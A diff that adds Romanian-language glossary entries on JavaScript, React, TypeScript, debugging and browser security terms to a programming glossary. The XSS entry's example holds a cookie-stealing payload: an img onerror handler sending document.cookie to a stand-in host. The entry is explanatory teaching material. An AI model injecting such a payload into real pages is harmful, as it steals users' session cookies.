@@ -52,13 +52,12 @@ Vezi și: event loop, async/await, asyncio
 ### event loop
 Forme: event loop, event loop-ul, event loop-ului, loop-ul, loop-ului
 
-Definiție: Bucla care programează și reia corutinele într-un program asyncio, de regulă pe un singur thread.
+Definiție: Bucla care, pe un singur thread, ia la rând următoarea bucată de lucru gata să continue: corutinele în asyncio, callback-urile și promisiunile în JavaScript.
 Scop: Coordonează sarcinile care așteaptă I/O, astfel încât una care așteaptă să nu blocheze celelalte.
-Exemplu: La `await asyncio.sleep(1)`, loop-ul rulează alte task-uri și reia corutina după expirare.
+Exemplu: La `await asyncio.sleep(1)`, loop-ul rulează alte task-uri și reia corutina după expirare. În browser, după un `fetch`, loop-ul randează pagina și tratează click-uri până vine răspunsul.
 Analogie: Un dispatcher care urmărește ce sarcini pot continua și le redistribuie.
-Limită: Un apel blocant direct, precum `time.sleep`, oprește loop-ul; folosești `await asyncio.sleep` sau `asyncio.to_thread`.
-Vezi și: corutină, asyncio, threadpool
-
+Limită: Un calcul lung blochează tot loop-ul: în asyncio nu mai rulează alte task-uri, în browser pagina nu mai răspunde.
+Vezi și: corutină, microtask, promisiune
 ### I/O-bound vs CPU-bound
 Forme: I/O-bound, CPU-bound
 
@@ -458,3 +457,356 @@ Exemplu: Kubernetes trimite întâi `SIGTERM`, apoi `SIGKILL` după grace period
 Analogie: Îți cer politicos să pleci versus îți închid ușa.
 Limită: `SIGKILL` nu oferă cleanup; poate lăsa conexiuni sau mesaje nereconfirmate.
 Vezi și: kill, grace period, container
+
+<!-- Termeni de frontend (5 nov. 2026, tichetul 01 din .scratch/frontend-extins). Formele evită ciocnirile: „DOM” singur ar lega ID-urile DOM-xx, „reconciliere” și „promisiune” singure au sens obișnuit în alte module. -->
+
+### closure
+Forme: closure, closure-ul, closure-ului, closures, closure-uri, closure-urile
+
+Definiție: O funcție împreună cu variabilele din locul unde a fost creată, pe care le poate citi și după ce acel loc s-a terminat.
+Scop: Permite unei funcții să „țină minte” date fără variabile globale: contoare, callback-uri, handlere.
+Exemplu: `makeCounter()` întoarce o funcție care crește un `n` local; fiecare contor are `n`-ul lui.
+Analogie: Un rucsac pe care funcția îl ia cu ea, cu variabilele din camera în care s-a născut.
+Limită: Closure-ul ține variabila, nu o copie a valorii; în Python și JavaScript vezi valoarea de la momentul apelului.
+Vezi și: stale closure, scope de bloc
+
+### stale closure
+Forme: stale closure, stale closure-ul, stale closures, closure vechi, closure-ul vechi
+
+Definiție: Un closure care citește valori dintr-un render mai vechi, pentru că a fost creat atunci și nu a mai fost recreat.
+Scop: Explică bug-ul clasic din React în care un `setInterval` sau un handler vede mereu state-ul inițial.
+Exemplu: `setInterval(() => setN(n + 1), 1000)` într-un effect cu `[]` vede mereu `n = 0`, deci contorul rămâne la 1.
+Analogie: O fotografie veche pe care o tot consulți ca să afli ce oră e.
+Limită: Repari cu forma funcțională (`setN(x => x + 1)`), cu dependențele corecte în effect sau cu un `useRef`.
+Vezi și: closure, render, effect
+
+### scope de bloc
+Forme: scope de bloc, scope-ul de bloc, block scope
+
+Definiție: Zona dintre `{` și `}` în care trăiește o variabilă declarată cu `let` sau `const`; `var` ignoră blocul și trăiește în toată funcția.
+Scop: Explică de ce `let` dintr-un `for` dă o variabilă nouă la fiecare iterație, iar `var` una singură.
+Exemplu: Cu `for (var i…)` și `setTimeout`, toate callback-urile afișează aceeași valoare finală; cu `let` afișează 0, 1, 2.
+Limită: Python nu are scope de bloc: o variabilă din `if` sau `for` rămâne vizibilă în toată funcția.
+Vezi și: hoisting, TDZ, closure
+
+### hoisting
+Forme: hoisting, hoisting-ul, hoisting-ului
+
+Definiție: Comportamentul prin care JavaScript înregistrează declarațiile la începutul scope-ului, înainte să ruleze codul.
+Scop: Explică de ce poți apela o funcție declarată mai jos și de ce un `var` citit înainte de declarație dă `undefined`, nu eroare.
+Exemplu: `console.log(x); var x = 1;` afișează `undefined`; cu `let x` aruncă `ReferenceError`.
+Limită: Se înregistrează doar declarația, nu valoarea. `let`, `const` și `class` sunt și ele înregistrate, dar stau în TDZ până la linia lor.
+Vezi și: TDZ, scope de bloc
+
+### TDZ
+Forme: TDZ, temporal dead zone, TDZ-ul
+
+Definiție: Porțiunea dintre începutul blocului și linia unde e declarat un `let` sau `const`, în care variabila există, dar nu poate fi citită.
+Scop: Transformă folosirea unei variabile înainte de declarație într-o eroare clară (`ReferenceError`), în loc de un `undefined` tăcut.
+Exemplu: `{ f(); let x = 1; function f() { return x; } }` aruncă `ReferenceError`, fiindcă `f` citește `x` din TDZ.
+Vezi și: hoisting, scope de bloc
+
+### prototip
+Forme: prototip, prototipul, prototipului, prototipuri, prototipurile, lanțul de prototipuri, prototype chain
+
+Definiție: Obiectul la care JavaScript caută o proprietate când ea lipsește din obiectul tău; prototipurile se leagă într-un lanț până la `Object.prototype`.
+Scop: E mecanismul de moștenire din JavaScript; `class` e doar o sintaxă mai comodă peste el.
+Exemplu: `[1, 2].map` nu stă în array, ci în `Array.prototype`, găsit pe lanț.
+Limită: Nu e o copie: dacă schimbi metoda din prototip, toate obiectele o văd imediat.
+Vezi și: closure
+
+### promisiune
+Forme: promisiunea, promisiunii, promisiuni, promisiunile, promisiunilor, Promise, promise-ul, promise-uri
+
+Definiție: Un obiect care reprezintă un rezultat care va veni mai târziu; e pending, apoi fulfilled (cu o valoare) sau rejected (cu o eroare).
+Scop: Permite cod asincron fără callback-uri imbricate; `async` / `await` e sintaxă peste promisiuni.
+Exemplu: `fetch(url)` întoarce imediat o promisiune; `await fetch(url)` așteaptă răspunsul.
+Limită: O promisiune e mereu truthy: `if (fetchUser())` fără `await` intră mereu pe ramură. O promisiune respinsă fără handler dă unhandled rejection.
+Vezi și: microtask, event loop
+
+### microtask
+Forme: microtask, microtask-ul, microtask-uri, microtask-urile, microtask-urilor
+
+Definiție: O sarcină scurtă, din coada de microtask-uri (de exemplu continuarea unei promisiuni), care rulează imediat după codul curent, înaintea oricărui timer.
+Scop: Explică ordinea: cod sincron → toate microtask-urile → următorul task (`setTimeout`, un click).
+Exemplu: `setTimeout(a, 0); Promise.resolve().then(b);` rulează `b` înaintea lui `a`.
+Limită: Coada se golește complet; un microtask care adaugă mereu altul blochează timerele și randarea.
+Vezi și: event loop, promisiune
+
+### JSX
+Forme: JSX, JSX-ul, JSX-ului, TSX
+
+Definiție: Sintaxa care arată ca HTML în cod JavaScript; compilatorul o transformă în apeluri care descriu elementele React.
+Scop: Descrii interfața ca structură, nu ca pași de modificare a paginii.
+Exemplu: `<Badge n={3} />` devine un obiect care spune „componenta `Badge` cu props `{ n: 3 }`”.
+Limită: JSX escapează textul automat; excepția e `dangerouslySetInnerHTML`.
+Vezi și: props, render
+
+### props
+Forme: props, props-urile, props-urilor
+
+Definiție: Datele pe care o componentă le primește de la părinte, ca argumente; componenta nu le modifică.
+Scop: Fac componentele reutilizabile: aceeași componentă, alte date.
+Exemplu: `<UserCard name="Ana" />` primește `props.name === "Ana"`.
+Limită: Copilul nu poate schimba props; ca să schimbe ceva în părinte, primește un callback prin props (`onChange`).
+Vezi și: state, render
+
+### state
+Forme: state, state-ul, state-ului
+
+Definiție: Datele pe care o componentă le ține de la un render la altul (`useState`); când le schimbi prin setter, React randează din nou componenta.
+Scop: E memoria componentei: ce a tastat userul, ce tab e deschis, ce a venit de la server.
+Exemplu: `const [n, setN] = useState(0);` iar `setN(1)` programează un render nou, cu `n = 1`.
+Limită: În același render, `n` nu se schimbă după `setN`: fiecare render are propria valoare, ca un snapshot.
+Vezi și: props, re-render, batching
+
+### hook
+Forme: hook, hook-ul, hook-ului, hook-uri, hook-urile, hook-urilor, hooks
+
+Definiție: O funcție React care începe cu `use` (`useState`, `useEffect`, `useRef`) și leagă componenta de mecanismele React.
+Scop: Dă unei componente funcție state, efecte și acces la context.
+Exemplu: `useFetch(url)` e un custom hook: o funcție a ta care apelează alte hook-uri.
+Limită: React recunoaște hook-urile după ordinea apelurilor, deci le apelezi doar la nivelul de sus, nu în `if`, bucle sau după un `return`.
+Vezi și: effect, state
+
+### effect
+Forme: effect, effect-ul, effect-ului, effect-uri, effect-urile, effect-urilor
+
+Definiție: Cod pus în `useEffect`, care rulează după ce React a actualizat pagina, ca să sincronizeze componenta cu ceva din afara ei (rețea, timer, socket).
+Scop: Separă descrierea interfeței (render) de lucrurile care au loc în exterior.
+Exemplu: Un effect deschide un WebSocket când apare componenta, iar cleanup-ul lui îl închide.
+Limită: Ce se poate calcula din props și state se calculează direct în render, nu într-un effect.
+Vezi și: cleanup, hook, Strict Mode
+
+### cleanup
+Forme: cleanup, cleanup-ul, cleanup-ului
+
+Definiție: Codul care eliberează ce ai pornit (o conexiune, un fișier, un timer, un abonament) când nu mai e nevoie de el.
+Scop: Previne resurse rămase deschise și efecte care continuă după ce nu mai au sens.
+Exemplu: În Python, `__exit__` sau un `finally`; în React, funcția întoarsă de un effect, care rulează înaintea următorului effect și la unmount.
+Limită: Un cleanup trebuie să ruleze și când apare o excepție sau o anulare; de aici `with`, `finally` și regula din asyncio de a reridica `CancelledError`.
+Vezi și: effect, mount / unmount
+
+### mount / unmount
+Forme: la mount, unmount, unmount-ul, unmount-ului, la unmount
+
+Definiție: Mount e momentul în care o componentă apare prima dată în pagină; unmount, momentul în care e scoasă și state-ul ei se pierde.
+Scop: Delimitează viața unei componente: effect-urile pornesc după mount, iar cleanup-ul final rulează la unmount.
+Exemplu: Când `{open && <Modal />}` trece pe `false`, `Modal` face unmount.
+Limită: În dev, Strict Mode face în plus un ciclu mount → unmount → mount, ca să verifice cleanup-ul.
+Vezi și: effect, cleanup, reconcilierea
+
+### render
+Forme: render, render-ul, render-ului, render-uri, render-urile, randare, randarea, randării, randează
+
+Definiție: Apelul funcției componentei, în care React află ce trebuie afișat (JSX-ul întors), pe baza props-urilor și a state-ului din acel moment.
+Scop: E pasul de calcul; abia după el React modifică pagina, doar unde e nevoie.
+Exemplu: Un `setN(1)` programează un render nou; în el, `n` e 1.
+Limită: Render-ul trebuie să fie pur: fără fetch, fără `setState` direct, fără modificări în afară; acelea merg în handlere sau effect-uri.
+Vezi și: re-render, reconcilierea, state
+
+### re-render
+Forme: re-render, re-render-ul, re-render-uri, re-render-urile, re-randare, re-randarea, re-randează
+
+Definiție: Un render nou al unei componente care e deja în pagină.
+Scop: Apare din trei motive: state-ul ei s-a schimbat, părintele a făcut re-render sau s-a schimbat un Context pe care îl citește.
+Exemplu: Când `App` face `setTheme`, toți copiii lui fac re-render, chiar dacă props-urile lor nu s-au schimbat.
+Limită: Un re-render nu înseamnă modificarea paginii: React schimbă doar ce iese diferit. Variabilele locale și `useRef` nu declanșează re-render.
+Vezi și: render, memoizare
+
+### reconcilierea
+Forme: reconcilierea, reconcilierii, reconciliation
+
+Definiție: Pasul în care React compară rezultatul noului render cu cel vechi și decide ce elemente păstrează, ce modifică și ce recreează.
+Scop: Explică de ce contează tipul elementului și `key`: același tip pe aceeași poziție își păstrează state-ul.
+Exemplu: Dacă înlocuiești `<input>` cu `<textarea>` pe aceeași poziție, React îl recreează și textul tastat se pierde.
+Limită: Cu `key={index}`, la reordonare, React lipește state-ul vechi de alt rând.
+Vezi și: render, mount / unmount
+
+### batching
+Forme: batching, batching-ul, batching-ului
+
+Definiție: Gruparea mai multor operații mici într-una singură, executată o dată.
+Scop: Economisește lucru repetat: React face un singur render după mai multe `setState`, iar DataLoader trimite o singură interogare pentru mai multe chei.
+Exemplu: Trei `setN` în același handler dau un singur render, nu trei.
+Limită: Din React 18, batching-ul e automat și în `setTimeout`, promisiuni și handlere native, nu doar în event-urile React.
+Vezi și: render, state
+
+### memoizare
+Forme: memoizare, memoizarea, memoizării, memoizează
+
+Definiție: Păstrarea rezultatului unui calcul, ca să nu-l refaci cât timp intrările sunt aceleași.
+Scop: În React evită calcule scumpe sau re-render-uri inutile (`useMemo`, `useCallback`, `memo`).
+Exemplu: `useMemo(() => sort(items), [items])` sortează din nou doar când se schimbă `items`.
+Limită: Costă memorie și comparații; React Compiler o face automat, iar manual o adaugi doar după ce Profiler-ul arată o problemă.
+Vezi și: re-render
+
+### Context (React)
+Forme: Context-ul, Context-ului, React Context
+
+Definiție: Mecanismul React prin care o valoare (tema, userul logat) ajunge la orice componentă de sub un Provider, fără să fie pasată prin props la fiecare nivel.
+Scop: Evită „prop drilling”, adică props transmise prin componente care nu le folosesc.
+Exemplu: `<ThemeContext.Provider value={theme}>`, iar oriunde dedesubt `useContext(ThemeContext)`.
+Limită: Când valoarea se schimbă, toți consumatorii fac re-render. E un canal de transport, nu un state manager.
+Vezi și: props, re-render, reducer
+
+### reducer
+Forme: reducer, reducer-ul, reducer-ului
+
+Definiție: O funcție pură `(state, action) => state nou`, care descrie toate schimbările de state într-un singur loc.
+Scop: Cu `useReducer`, logica unui state cu multe tranziții (un formular, un coș) se testează separat de componentă.
+Exemplu: `dispatch({ type: "add", item })`, iar reducer-ul întoarce `{ ...state, items: [...state.items, item] }`.
+Limită: Reducer-ul nu modifică state-ul vechi și nu face fetch; întoarce mereu o copie.
+Vezi și: state, Context (React)
+
+### input controlat
+Forme: input controlat, input-ul controlat, inputuri controlate, input-uri controlate, inputurile controlate, input necontrolat, inputuri necontrolate, controlled input
+
+Definiție: Un input a cărui valoare vine din state (`value={text}` plus `onChange`); la unul necontrolat, valoarea stă în DOM-ul browserului și o citești cu un `ref`.
+Scop: Cu inputuri controlate, valoarea e mereu în state: o validezi, o formatezi sau o resetezi din cod.
+Exemplu: `<input value={q} onChange={e => setQ(e.target.value)} />`
+Limită: `value` fără `onChange` face inputul read-only, iar React avertizează în consolă.
+Vezi și: state, DOM-ul
+
+### DOM-ul
+Forme: DOM-ul, DOM-ului, arborele DOM
+
+Definiție: Arborele de obiecte prin care browserul reprezintă pagina; fiecare tag HTML e un nod pe care JavaScript îl poate citi și modifica.
+Scop: React modifică DOM-ul în locul tău, după ce compară render-urile; tu descrii doar rezultatul.
+Exemplu: `document.querySelector("input").value` citește direct din DOM.
+Limită: Dacă modifici DOM-ul pe lângă React, la următorul render React poate suprascrie schimbarea.
+Vezi și: reconcilierea, input controlat
+
+### Strict Mode
+Forme: Strict Mode, Strict Mode-ul, StrictMode
+
+Definiție: Un mod React doar pentru dezvoltare, care rulează în plus unele funcții de două ori, ca să iasă la iveală bug-urile.
+Scop: Găsești devreme effect-uri fără cleanup și render-uri care nu sunt pure.
+Exemplu: Un effect care deschide o conexiune fără să o închidă se vede imediat: în dev apar două conexiuni.
+Limită: Dublarea apare doar în dev, nu în producție.
+Vezi și: effect, cleanup
+
+### tipare structurală
+Forme: tipare structurală, tiparea structurală, structural typing
+
+Definiție: Regula TypeScript după care două tipuri sunt compatibile dacă au aceeași formă (aceleași proprietăți), indiferent de nume.
+Scop: Poți pasa orice obiect care are câmpurile cerute, fără să declari că „implementează” ceva.
+Exemplu: `{ id: 1, name: "Ana", age: 30 }` se potrivește cu `type User = { id: number; name: string }`, dacă vine dintr-o variabilă.
+Limită: Un literal pasat direct cu o proprietate în plus dă eroare (excess property check). În C++ sau Java, compatibilitatea e după nume (tipare nominală).
+Vezi și: tip generic, narrowing
+
+### tip generic
+Forme: tip generic, tipuri generice, tipul generic, funcție generică, funcția generică, funcții generice, hook generic, componentă generică, generics
+
+Definiție: Un tip sau o funcție cu un parametru de tip (`<T>`), completat la fiecare folosire, ca aceeași logică să meargă cu orice tip, fără să-l pierzi.
+Scop: `useFetch<User>(url)` întoarce `User`, nu `any`, și același hook servește orice endpoint.
+Exemplu: `function first<T>(xs: T[]): T | undefined { return xs[0]; }`
+Limită: Parametrul de tip dispare la runtime, spre deosebire de template-urile C++, care generează cod pentru fiecare tip.
+Vezi și: utility type, tipare structurală
+
+### narrowing
+Forme: narrowing, narrowing-ul, narrowing-ului
+
+Definiție: Restrângerea unui tip larg (`string | null`, un union) la unul mai precis, după o verificare pe care TypeScript o urmărește.
+Scop: După `if (user)`, TypeScript știe că `user` nu e `null` și te lasă să-i folosești câmpurile.
+Exemplu: `typeof x === "string"`, `"id" in x`, `x instanceof Date` și `x.kind === "ok"` restrâng tipul.
+Limită: Narrowing-ul ține doar cât TypeScript poate urmări; după un callback sau o reasignare, poate fi pierdut.
+Vezi și: type guard, union discriminat
+
+### type guard
+Forme: type guard, type guard-ul, type guard-uri, type guards
+
+Definiție: O funcție care întoarce `x is T`; când întoarce `true`, TypeScript tratează valoarea ca `T`.
+Scop: Pui o verificare de runtime într-o funcție reutilizabilă, iar compilatorul o folosește la narrowing.
+Exemplu: `function isUser(x: unknown): x is User { return typeof x === "object" && x !== null && "id" in x; }`
+Limită: TypeScript crede ce spune funcția; un type guard greșit minte compilatorul.
+Vezi și: narrowing, type assertion
+
+### union discriminat
+Forme: union discriminat, union-ul discriminat, union-uri discriminate, union-urile discriminate, uniune discriminată, discriminated union
+
+Definiție: Un union de tipuri obiect care au un câmp comun cu valori literale diferite (`kind: "ok" | "error"`), după care TypeScript află varianta.
+Scop: Modelezi stări care se exclud (încărcare, eroare, date), iar compilatorul te lasă să citești doar câmpurile variantei curente.
+Exemplu: `type R = { kind: "ok"; data: User } | { kind: "error"; msg: string }`
+Limită: Cu `never` în ramura `default` a unui `switch`, compilatorul te anunță când adaugi o variantă netratată.
+Vezi și: narrowing
+
+### utility type
+Forme: utility type, utility types, utility type-uri
+
+Definiție: Un tip predefinit în TypeScript care construiește un tip nou din altul: `Partial`, `Required`, `Pick`, `Omit`, `Record`, `ReturnType`.
+Scop: Derivezi tipuri din cele existente în loc să le rescrii, deci rămân sincronizate.
+Exemplu: `type Patch = Partial<User>` face toate câmpurile opționale, ca la un `PATCH`.
+Vezi și: tip generic
+
+### type assertion
+Forme: type assertion, type assertion-ul, type assertions
+
+Definiție: `x as T`: îi spui compilatorului să trateze o valoare ca `T`, fără nicio verificare la runtime.
+Scop: E util doar când știi mai mult decât compilatorul (de exemplu un element DOM pe care îl știi sigur).
+Exemplu: `const u = (await res.json()) as User;` compilează, chiar dacă serverul trimite altceva.
+Limită: Dacă presupunerea e greșită, eroarea apare mai târziu, la runtime (`Cannot read properties of undefined`). Pentru date externe validezi (zod).
+Vezi și: type guard
+
+### stack trace
+Forme: stack trace, stack trace-ul, stack trace-ului, stack trace-uri
+
+Definiție: Lista apelurilor active în momentul unei erori, de la locul unde a apărut până la punctul de pornire.
+Scop: Arată unde a apărut eroarea și pe ce drum s-a ajuns acolo; o citești de sus în jos, căutând prima linie din codul tău.
+Exemplu: `TypeError: Cannot read properties of undefined (reading 'name')`, urmat de `at UserCard (UserCard.tsx:12:18)`.
+Limită: În producție, codul e minificat; fără source map, liniile arată fișierul compilat.
+Vezi și: source map, breakpoint
+
+### source map
+Forme: source map, source map-ul, source map-uri, source maps
+
+Definiție: Un fișier care leagă codul compilat și minificat de codul sursă original, linie cu linie.
+Scop: DevTools îți arată erorile și breakpoint-urile în fișierul tău `.tsx`, nu în bundle.
+Exemplu: `app.3f9a.js.map` lângă `app.3f9a.js`; Vite îl generează automat în dev.
+Limită: Publicat în producție, source map-ul expune codul sursă; de regulă îl urci doar la serviciul de erori (Sentry).
+Vezi și: stack trace
+
+### breakpoint
+Forme: breakpoint, breakpoint-ul, breakpoint-ului, breakpoint-uri, breakpoint-urile, breakpoints
+
+Definiție: Un punct în cod unde debugger-ul oprește execuția, ca să vezi variabilele și stack-ul din acel moment.
+Scop: Vezi starea reală, în loc s-o ghicești din `console.log`-uri.
+Exemplu: Instrucțiunea `debugger;` oprește execuția acolo dacă DevTools e deschis; un breakpoint condițional se oprește doar când `id === 42`.
+Limită: În CoderPad ai de regulă doar consola; acolo înlocuiești breakpoint-ul cu `console.log` țintite.
+Vezi și: stack trace, source map
+
+### error boundary
+Forme: error boundary, error boundary-ul, error boundaries, error boundary-uri
+
+Definiție: O componentă React care prinde erorile aruncate la render de componentele de sub ea și afișează o interfață de rezervă, în loc de o pagină goală.
+Scop: O eroare dintr-un widget nu mai dărâmă toată aplicația.
+Exemplu: `<ErrorBoundary fallback={<p>Ceva n-a mers</p>}><Chart /></ErrorBoundary>`
+Limită: Nu prinde erori din handlere de event-uri, din cod async (`setTimeout`, promisiuni) sau din ea însăși; acolo folosești `try` / `catch`. Se scrie încă cu o clasă (sau biblioteca `react-error-boundary`).
+Vezi și: stack trace
+
+### CORS
+Forme: CORS, CORS-ul, CORS-ului
+
+Definiție: Regula prin care browserul permite unei pagini să citească răspunsul de la altă origine doar dacă serverul o acceptă explicit, prin header-e `Access-Control-Allow-*`.
+Scop: Protejează userul: un site străin nu poate citi, cu cookie-urile userului, datele de pe alt site.
+Exemplu: Frontend-ul de pe `app.exemplu.ro` apelează `api.exemplu.ro`, iar serverul răspunde cu `Access-Control-Allow-Origin: https://app.exemplu.ro`.
+Limită: CORS e aplicat de browser, nu de server; `curl` sau un alt server nu țin cont de el. Nu e o protecție a API-ului.
+Vezi și: preflight, XSS
+
+### preflight
+Forme: preflight, preflight-ul, preflight-ului, cererea preflight
+
+Definiție: Cererea `OPTIONS` pe care browserul o trimite înaintea unei cereri cross-origin „nesimple”, ca să întrebe serverul dacă o acceptă.
+Scop: Serverul poate refuza metoda sau header-ele înainte ca cererea reală să plece.
+Exemplu: Un `POST` cu `Content-Type: application/json` sau cu header-ul `Authorization` declanșează un preflight.
+Limită: Dacă serverul nu răspunde corect la `OPTIONS`, în consolă vezi o eroare CORS, iar cererea reală nu mai pleacă deloc.
+Vezi și: CORS
+
+### XSS
+Forme: XSS, XSS-ul, XSS-ului
+
+Definiție: Atacul în care un script străin ajunge să ruleze în pagina ta, de obicei din date introduse de un user și afișate fără escapare.
+Scop: Scriptul rulează cu drepturile userului: citește date, trimite cereri în numele lui.
+Exemplu: Un comentariu `<img src=x onerror="fetch('//evil?c='+document.cookie)">` afișat prin `dangerouslySetInnerHTML`.
+Limită: JSX escapează textul, deci riscul vine din `dangerouslySetInnerHTML`, din URL-uri `javascript:` și din biblioteci care scriu direct în DOM.
+Vezi și: CORS, JSX
